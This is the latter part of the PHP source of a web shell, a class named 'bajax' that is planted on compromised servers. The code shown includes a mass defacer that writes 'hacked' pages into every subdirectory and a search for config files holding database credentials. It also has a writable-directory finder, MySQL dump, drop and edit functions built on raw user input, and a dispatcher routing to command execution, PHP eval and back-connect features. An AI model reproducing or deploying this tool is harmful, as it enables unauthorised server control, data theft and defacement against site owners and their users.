					$r.='`'.$result[0].'` '.$result[1].($result[2]=='NO'&&$result[4]!='NULL'?' NOT NULL ':' DEFAULT NULL').strtoupper($result[5]).($result[5]==true?" PRIMARY KEY":'').(reset($result)?',':'')."\n";
				} 
				$result=mysql_fetch_array($query2);
				$r.='`'.$result[0].'` '.$result[1].($result[2]=='NO'&&$result[4]!='NULL'?' NOT NULL ':' DEFAULT NULL').strtoupper($result[5]).($result[5]==true?" PRIMARY KEY":'')."\n";
				$r.=");\n";
				$select=$this->qe("SELECT * FROM $db.$d");


				while($data=mysql_fetch_assoc($select))
				{
					$col=implode(', ',array_keys($data));
					$val=implode("', '",array_values($data));
						$r.="INSERT INTO  `$d` ($col) VALUES ('$val');\n";
				}
				$r.="\n";
			}
		}
		 else echo "i don't know brow";
		
		(!isset($tbl)?$name="$db.sql":$name="$db.$tbl.sql");
		ob_get_clean();
		header("Content-type:application/octet-stream");
		header("Content-length:".strlen($r));
		header("Content-Disposition:attachment;filename=$name;");
		echo $r;
		exit();
		$this->free($query);
		$this->free($query2);
		$this->free($select);
		mysql_close();
	}
	//drop database or table
	function dropsql()
	{
		$this->connector();
		if(!isset($_GET['tbl'])){
			$d=$this->qe("DROP DATABASE $_GET[db]");
			header("location:?act=mysql");
		}
		elseif(isset($_GET['db'])&&isset($_GET['tbl']))
		{
			$this->qe("DROP TABLE $_GET[db].$_GET[tbl]");
			header("location:?act=showtable&db=$_GET[db]");
		}
	}
	//create new database
	function createdb($name)
	{
		$this->connector();
		if(!empty($name))
		{
			$q=$this->qe("CREATE DATABASE $name");
			(!$q?$r.=mysql_error():$r.="Good Brow");
			
		}
		else $r.="Fill DB Name";
		//header("location:?act=mysql");
	}
	//edit specific record on tables
	function editrow()
	{
		$c=$this->connector();
		$r='';
			$r.=$this->logout();
			 $db=$_GET['db'];
			$tbl=$_GET['table'];
			$val=$_GET['val'];
			$col=$_GET['col'];
			$r.="<div id='isi'>
			<center><a href='?act=showtable&db=$db'>Show Tables </a></center><br />";
			$r.="<form method='post' action='?act=showcon&db=$db&table=$tbl&col=$col&val=$val'>";
			$r.="<table width=100% align='center' cellspacing=0 class='xpltab'>";
			
			$cols=array();
			$iml=mysql_query("SHOW COLUMNS FROM $db.$tbl");
			$query=mysql_query("SELECT * FROM $db.$tbl WHERE $col='$val'");
			
			while($colom=mysql_fetch_assoc($iml))$cols[]=$colom['Field'];
			$data=mysql_fetch_assoc($query);
			for($i=0;$i<count($cols);$i++)
			{
				$pt=$cols[$i];
				$r.="<tr><td style='border:none'>".$pt."</td><td style='border:none'>".' : <input id="sqlbox" type="text" name="'.$cols[$i].'" value="'.$data[$pt].'"></td></tr>';

			}
			$r.="</table><input type='hidden' name='action' value='updaterow'><input id='but' type='submit' value='update'></form></div>";
			return $r;
			$this->free();
	}
	//updat record
	function updaterow()
	{
		$this->connector();
		 $db=$_GET['db'];
			$tbl=$_GET['table'];
			$val=$_GET['val'];
			$col=$_GET['col'];
			
			array_pop($_POST);
			foreach ($_POST as $key => $value) {
				$c=$this->qe("UPDATE $db.$tbl SET $key='$value' WHERE $col='$val'");
				$r.=header("location:?act=showcon&db=$db&table=$tbl");
			}
			$this->free($c);
	}
	//delete record
	function droprow()
	{
		$this->connector();
		$this->qe("DELETE FROM $_GET[db].$_GET[table] WHERE $_GET[col]='$_GET[val]'");
		$r.=header("location:?act=showcon&db=$_GET[db]&table=$_GET[table]");
	}
	//insert record
	function insertrow()
	{
		$this->connector();
		$db=$_GET['db'];
			$tbl=$_GET['table'];
			$r='';
			if(!isset($_POST['kirim']))
			{
				$r.="<div id='isi'><center><a href='?act=showtable&db=$db'>Show Tables </a></center><br />";
			$r.="<form method='post' action='?act=showcon&db=$db&table=$tbl'>";
			$r.="<table width=100% align='center' cellspacing=0 class='xpltab'>";
			
			$cols=array();
			$iml=mysql_query("SHOW COLUMNS FROM $db.$tbl");
			while($colom=mysql_fetch_assoc($iml))$cols[]=$colom['Field'];
			for($i=0;$i<count($cols);$i++)
			{
				$pt=$cols[$i];
				$r.="<tr><td style='border:none'>".$pt."</td><td style='border:none'>".' : <input id="sqlbox" type="text" name="'.$cols[$i].'"></td></tr>';
			}
			$r.="</table><input type='hidden' name='action' value='insertrow'><input id='but' type='submit' name='kirim' value='Insert'></form></div>";
			return $r;
			} else {
				array_pop($_POST);
				array_pop($_POST);
				$val=array();
				$c="INSERT INTO $_GET[db].$_GET[table] VALUES (";
				foreach ($_POST as $value) {
					$val[]=$value;
				}
				for($i=0;$i<count($val);$i++)
				{
					($i==count($val)-1?$c.="'$val[$i]'":$c.="'$val[$i]',");	
				}
				$c.=");";
				$qu=$this->qe($c);
				(!$qu?$r.="Failed brow, error on: ".mysql_error():$r.="Success");	
			}
		return $r;
	}
	function sqlcommand()
	{
		$r="<center><form method='post' action='?act=sqlcmd'>Quick Query <input type='text' value='show databases' name='sqlcmd' style='width:500px;margin-top:14px;' id='box'><input type='submit' name='submit' value='Go' id='but'></form></center>";
		return $r;
	}

	//display sql query 
	function sqlcmd()
	{
		$this->connector();
		$r='<div id="isi">';
		if(isset($_POST['submit']))
		{
			$re=$_POST['sqlcmd'];
		if(!empty($re))
		{
			$qe=$this->qe($re);
			if($qe)
			{
				$r.="<table align=center cellpadding=5 style='width:100%;font-size:12px;'><tr>";
				for($i=0;$i<mysql_num_fields($qe);$i++)
				{
					$r.="<th style='border:thin dashed #f00;background:#f00;'>".htmlspecialchars(mysql_field_name($qe,$i))."</th>";
				}
				$r.="</th>";
				while ($dat=mysql_fetch_row($qe)) {
					$r.="<tr>";
					for($n=0;$n<mysql_num_fields($qe);$n++)
					{
						$r.="<td style='border-bottom:thin dashed #f00;'>".htmlspecialchars($dat[$n])."</td>";
					}
					$r.="</tr>";
				}
				$r.="</table>";
			} else $r.="<center>".$re."<br />Error brow, check your query";
		}else $r.="<center>Fill the query brow </center>";
		
		}
		$r.=$this->sqlcommand();
		$r.="</div>";
		return $r;
	}

	//converter form
	function converter()
	{
		$r='';
		$r.="<div id='isi'>";
		$opt=array("MD5"=>"md5","Hex"=>"hexa","Base64 Encoder"=>"64en","Base64 Decoder"=>"64de","SHA1"=>"sha1","URL Encoder"=>"urlen","URL Decoder"=>"urlde");
		if(isset($_POST['submit'])&&!empty($_POST['convert']))
		{
			$val=$this->convert($_POST['isi']);
			$r.="<textarea >$val</textarea>";
		}
		$isi="<center><form method='post' action='?act=encode'><textarea style='width:50%;height:100px;border:1px solid #f00;' name='convert' ></textarea><br /><select name='isi' id='box'>";
			foreach ($opt as $k=>$v) {
				$isi.="<option value=$v>".$k."</option>";
			}
			$r.=$isi."<input type='submit' name='submit' style='color:#fff' id='but' value='Convert'></form></center></div>";
			return $r;
	}
	//display valuable info on server 
	function infoser()
	{
		$r="<div id='isi'><table style='font-size:12px;'>";
		$r.="<tr><td>Disable Function </td><td>: ".(ini_get('disable_functions')?ini_get('disable_functions'):"All Function Enable")."</td></tr>";;
		$r.="<tr><td>Safe Mode </td><td>: ".(ini_get('safe_mode')?"On":"Off")."</td></tr>";
		$r.="<tr><td>Open Base Dir </td><td>: ".ini_get('openbase_dir')."</td></tr>";
		$r.="<tr><td>Php version </td><td>: ".phpversion()."</td></tr>";
		$r.="<tr><td>Register Global </td><td>: ".(ini_get('register_global')?'Enable':'Disable')."</td></tr>";
		$r.="<tr><td>Curl </td><td>: ".(extension_loaded('curl')?'Enable':'Disable')."</td></tr>";
		$r.="<tr><td>Database Mysql </td><td>: ".(function_exists('mysql_connect')?'On':'Off')."</td></tr>";
		$r.="<tr><td>Magic Quotes </td><td>: ".(ini_get('Magic_Quotes')?'On':'Off')."</td></tr>";
		$r.="<tr><td>Remote Include </td><td>: ".(ini_get('allow_url_include')?'Enable':'Disable')."</td></tr>";
		$r.="<tr><td>Disk Free Space </td><td>: ".$this->getSize(diskfreespace($this->dir()))."</td></tr>";
		$r.="<tr><td>Total Disk Space </td><td>: ".$this->getSize(disk_total_space($this->dir()))."</td></tr>";
		$r.="</table></div>";
		return $r;
	}
		//display available drive on winbox 
	function drive()
	{
		$r='';
		foreach (range("A", "Z") as $val) {
		if(is_dir($val.":".DIRECTORY_SEPARATOR))
		{
			
			$ad=$val.":".DIRECTORY_SEPARATOR;
			$r=$r.="<a href='?act=file&dir=$ad'>$val:".DIRECTORY_SEPARATOR."</a> ";
		}
			}
		return $r;
	}
	//find writable directory
	function scdir($dir)
	{
		$r='';
		$dname=array();
		if($dh=opendir($dir))
		{
			while (false !==($name=readdir($dh))) {
			
				if($name !='.'&&$name!='..')
				{
					if(is_dir($name)&&is_writable($name))
					{
						
						$dname[]=$name;
					}
				}					
			}
			closedir($dh);
		}
		if($dname)
		{
			foreach ($dname as $val) {
			$r.="<a href='?act=file&dir=".$dir.$val.DIRECTORY_SEPARATOR."'>".$dir.$val."</a><hr style='border:thin solid #2e2e2e' />";
		}
		} else $r.="Not Found";
		
		
			return $r;
	}
	//writable scanner form
	function writable()
	{
		$r="<div id='isi'>";
		if(isset($_POST['finddir'])&&isset($_POST['submit']))
		{
			$r.=$this->scdir($_POST['finddir']);
			
		} //else {
			$r.="<center>Find All Writable Directory <br /><form method='post' action='?act=write&dir=".$this->dir()."'>".$this->current('write')."<br /><input type='hidden' name='finddir' id='box' value='".$this->dir()."'><input id='but' type='submit' style='margin-top:5px;color:#fff'  name='submit' value='Search'></center><form>";
		//}
		$r.="</div>";
		return $r;
	}
	
	//mass defacer 
	function mass()
	{
			$r="<div id='isi'>";
		if(isset($_POST['def'])&&isset($_POST['fname'])&&isset($_POST['isinya']))
		{
			$r.=$this->deface($_POST['addr']);
			//$r.=$this->scdir($_POST['addr']);
		}
		else {
			$r.="<center><form method='post' action='?act=md&dir=".$this->dir()."'>Mass Defacer <br /><input type='hidden' style='width:500px;' name='addr' id='box' value='".$this->dir()."'>".$this->current('md')."<br />File Name <input type='text' name='fname' value='hack.htm' style='margin:7px 0;' id='box'><br />
		<textarea name='isinya' style='border:1px solid #f00;'><h1>hacked</h1></textarea><br /><input type='submit' name='def' id='but' value='Deface'></form></center>";
		$r.="</div>";
		}
		
		return $r;
	}
	//mass defacer funct
	function deface($path)
	{
		$r='';
		// Open the folder
 	 if ( !( $dir = opendir( $path ) ) ) die( "Can't open $path" );
  	$filenames = array();
 	 while ( $filename = readdir( $dir ) ) {
    if ($filename != '.'&&$filename != '..') {
      if ( is_dir( "$path/$filename" ) )
      $filenames[] = $filename;
    }
  }
 
  closedir ( $dir );
  if ($filenames) {
  	$r.="Mass Deface Success inside these folder & it's subfolder <br />";
  foreach ( $filenames as $filename ) {

    	$this->deface( "$path/" . $filename );
    	$r.="<a href='?act=file&dir=".$path.$filename.DIRECTORY_SEPARATOR."'>".$path.$filename."</a><hr style='border:thin solid #2e2e2e' />";
    	$op=fopen($path."/".$filename."/".$_POST['fname'],"w" );
    	fwrite($op, $_POST['isinya']);
    	fclose($op);
    
  } }
  	 else {$r.="failed";
		}
 
 return $r;
	}
	//backdoor function 
	function bdf($dir)
	{
		
		$r='';
		$has=$_POST['bug'];
		if($files = @scandir($dir)) {
			foreach($files as $file) {
				if($file != '.' && $file != '..'&& $file !='cgi-bin') {
				if(@is_dir($dir.$slash.$file)) {
					$r.=$this->bdf($dir.$file.DIRECTORY_SEPARATOR);
				   
				} else {
					$op = @file_get_contents($dir.DIRECTORY_SEPARATOR.$file);
					if($op)
						foreach($has as $bug) {
							if(@preg_match("/$bug\((.*?)\)/", $op)) {
								
							   $r.="<tr><td>Contain '$bug' at <a href='?act=lihat&dir=".$this->dir()."&file=".$dir.$file."'>$dir.$file</a></td><td>".date("d-M-Y H:i",filemtime($dir.$file))."</td></tr>";
								
							} 
						}
						
				}
			}
		}
		}
		return $r;
		}

	//backdoor scanner form 
	function doorscan()
	{
		$this->find = array('base64_decode','system','passthru','popen','exec','shell_exec','eval','move_uploaded_file','copy','pcntl_exec','escapeshellarg','escapeshellcmd','proc_open','proc_get_status','proc_nice','proc_open','proc_terminate');
		$r="<div id='isi'>";
		if(isset($_POST['submit'])&&isset($_POST['bug']))
		{	$r.="<table width='100%'' class='xpltab'><tr><th>These Files Probably Backdoor</th><th>Last Modified</th></tr>";
			$r.=$this->bdf($_POST['dir']);
			$r.="</table>";
		}
		else {
		
			$r.="<center><form method='post' action='?act=bds&dir=".$this->dir()."'>Scan In : <input type='hidden' name='dir' value='".$this->dir()."'>".$this->current('bds')."<br />Scan Type : </center>";
foreach ($this->find as $val) {
			$r.="<input style='margin-left:43%;margin-top:7px;' type='checkbox' name='bug[]' value='".$val."'>".$val."<br />";
		}
			$r.="<center><input type='submit' name='submit' id='but' style='margin-top:10px;width:150px;color:#fff' value='Search Backdoor'></form>";
			$r.="</center>";
		}
		$r.="</div>";
		
		
		return $r;
	}

	function newmass($dir,$file,$source)
	{
		if(isset($_POST['dir'])&&isset($_POST['file'])&&isset($_POST['source']))
		{
			
		}
		else {
			$r.="<center><form method='post' action='?act=md&dir=".$this->dir()."'>Mass Defacer <br /><input type='hidden' style='width:500px;' name='addr' id='box' value='".$this->dir()."'>".$this->current('md')."<br />File Name <input type='text' name='fname' value='index.php' style='margin:7px 0;' id='box'><br />
		<textarea name='isinya' style='border:1px solid #f00;'><h1>hacked</h1></textarea><br /><input type='submit' name='def' id='but' value='Deface'></form></center>";
		$r.="</div>";
		}
	}

//config locator
function locate()
{
	$r="<div id='isi'>";
	if (isset($_POST['cari'])) {
		$r.="<table width='100%'' class='xpltab'><tr><th>These Files Probably config File</th></tr>";
		$r.=$this->loc($_POST['addr']);
		$r.="</table>";
	}else {
		$r="<center><form method='post' action='?act=loc&dir=".$this->dir()."'>Find config file<br />
		<input type='hidden' style='width:500px;' name='addr' id='box' value='".$this->dir()."'>".$this->current('loc')."<br />
	<input type='submit' name='cari' id='but' value='Search'></form></center>";
	}
	$r.="</div>";	
		return $r;
}
	function loc($dir)
	{
		
		$r='';
	
		if($files = @scandir($dir)) {
			foreach($files as $file) {
				if($file != '.' && $file != '..') {
				if(@is_dir($dir."\\".$file)) {
					$r.=$this->loc($dir.$file.DIRECTORY_SEPARATOR);
				   
				} else {
					$sp = @file_get_contents($dir.DIRECTORY_SEPARATOR.$file);
					if($sp)
						
							if((stripos($sp, "\"localhost\""))|| (stripos($sp,'localhost'))) {
							   $r.="<tr><td> <a href='?act=lihat&dir=".$this->dir()."&file=".$dir.$file."'>$dir.$file</a></td></tr>";
								
							}
				}
			}
		}
		}
		return $r;
		}
//lihat file 
		function lihat($file)
		{	$r=''; 
			$r.="<table align=center cellpadding=5 style='width:100%;font-size:12px;'><tr><td >Action</td>
			<td ><a href='?act=edit&dir=".$this->dir()."&file=$file'>Edit</a> &nbsp;|&nbsp;<a href='?act=down&file=".$this->replace($file)."'>Download</a>
			|&nbsp; <a href='?act=file&act2=del&file=".$this->replace($file)."'>Del</a></td></tr><table>";
				$r.="<div id='see'>";

				$file = wordwrap(file_get_contents($file),"240","\n");
				$li= highlight_string($file,true);
				$old = array("0000BB","000000","FF8000","DD0000", "007700");
				$new = array("4C83AF","888888", "87DF45", "EEEEEE" , "FF8000");
				$r.= str_replace($old,$new, $li);
				$r.="</div>";	
				return $r;

		}
		function auth()
				{
				$res='<style>body{background:#000;}input {background:#120f0b;border:none;color:#f00;}</style><div style="font-size:12px;color:#f00;position:fixed;top:10px;left:50%;margin-left:-150px;padding:10px 50px 50px 10px;background:#120f0b;border-top:20px solid #f00;-moz-box-shadow:inset 0 0 10px #00c6ff;
   -webkit-box-shadow: inset 0 0 10px #00c6ff;
   box-shadow: 0 0 10px #f00;
   border-radius:5px"><form method="post" action="">
				<input value="root@cyb3r-3rr0r:-$" disabled="disabled"><br>login :
				<input  type="password" autofocus="autofocus" name="pass" >
				<input type="submit" style="display:none" name="auth">
				</form></div>';
				return $res;
				}


		//eat cookie
		function cookies()
		{
						
			if(isset($_POST['auth'])) {
				$pass=strtolower(trim(md5($_POST['pass'])));
				if($this->password=$pass)
				{
					setcookie('bajax',$pass,time()+3600*24);
					$url=$_SERVER['SCRIPT_NAME'];
					header('location:'.$url);
					die();
				}
			}
			if(!isset($_COOKIE['bajax']) || $_COOKIE['bajax'] !=$this->password)
			{
				echo $this->auth();
				die();
			}

		}

		
}


$bajax=new bajax();
$r='';
$r.=$bajax->header();
$r.=$bajax->menu();
$r.="</div='isi'>";
switch ($_GET['act']) {
	case 'file':
	
	if(isset($_GET['act2'])=='del')
	$r.=$bajax->remfile();
	if(isset($_GET['act3'])=='del')
	$r.=$bajax->remdir();
	$r.=$bajax->xpl();	
	$r.=$bajax->center();
	break;
	case 'edit':
	$r.=$bajax->edit($_GET['file']);
	break;
	case 'ren':
	$r.=$bajax->ren($_GET['file']);
	break;
	case 'cmd':
	$r.=$bajax->command();
	$r.=$bajax->center();
	break;
	case 'down':
	$r.=$bajax->downloadfile($_GET['file']);
	break;
	case 'downfolder':
	$r.=$bajax->downloadfolder($_GET['file']);
	break;
	case 'mysql':
	$r.=$bajax->login();
	break;
	case 'view':
	$r.=$bajax->lihatdb();
	break;
	case 'showtable':
	$r.=$bajax->showtable();
	break;
	case 'showcon':
	$r.=$bajax->showcon();
	break;
	case 'downdb':
	$r.=$bajax->downdb();
	break;
	case 'editrow':
	$r.=$bajax->editrow();
	break;
	case 'logout':
	$_SESSION=array();
	session_destroy();
	header("location:?act=mysql");
	break;
	case 'dropdb':
	$r.=$bajax->dropsql();
	break;
	case 'delrow':
	$r.=$bajax->droprow();
	break;
	case 'insertrow':
	$r.=$bajax->insertrow();
	break;
	case 'sqlcmd':
	$r.=$bajax->sqlcmd();
	break;
	case 'encode':
	$r.=$bajax->converter();
	break;
	case 'ser':$r.=$bajax->infoser();break;
	case "eval":
	$r.=$bajax->phpeval();$r.=$bajax->center();
	break;
	case 'write':
	$r.=$bajax->writable();break;
	case 'bds':$r.=$bajax->doorscan();break;
	case 'md':$r.=$bajax->mass();break;
	case 'bc':$r.=$bajax->door();break;
	case 'loc':$r.=$bajax->locate();break;
	case 'lihat':$r.=$bajax->lihat($_GET['file']);break;
	case 'out':setcookie('bajax','',time()-3600*24);header("location:".$_SERVER['SCRIPT_NAME']);break;
	default:
	$r.=$bajax->logo();
	break;

}
switch ($_POST['action']) {
	case 'editfile':
		if($bajax->editfile($_POST['file']))
		$r.=header("location:?act=edit&dir=".$bajax->dir()."&file=".$_GET['file']."");
		
		break;
	case 'renamed':
		if($bajax->rename($_POST['file']))
		$r.=header("location:?act=file&dir=".$bajax->dir()."");
	break;
	case "mkdir":
	$r.=$bajax->mkdir();
	$r.=header("location:?act=file&dir=".$bajax->dir()."");
	break;
	case "createfile":
	$r.=$bajax->createfile();
	$r.=header("location:?act=file&dir=".$bajax->dir()."");
	break;
	
	case "uploader":
	$r.=$bajax->upload();
	$r.=header("location:?act=file&dir=".$bajax->dir()."");
	break;
	case 'createdb':
	$r.=$bajax->createdb($_POST['dbname']);
	break;
	case 'updaterow':
	$r.=$bajax->updaterow();
	break;
	case 'insertrow':
	$r.=$bajax->insertrow();
	break;
	case 'mass':
	$r.=$bajax->newmass($_POST['dir'],$_POST['file'],$_POST['source']);
	break;
	case 'bc':
	$r.=$bajax->bc();
	break;
	
}
$r.="</div>";
$r.=$bajax->footer();
$bajax->cookies();
echo $r;

?>

<?php
ob_end_flush();
?>

<body>
</html>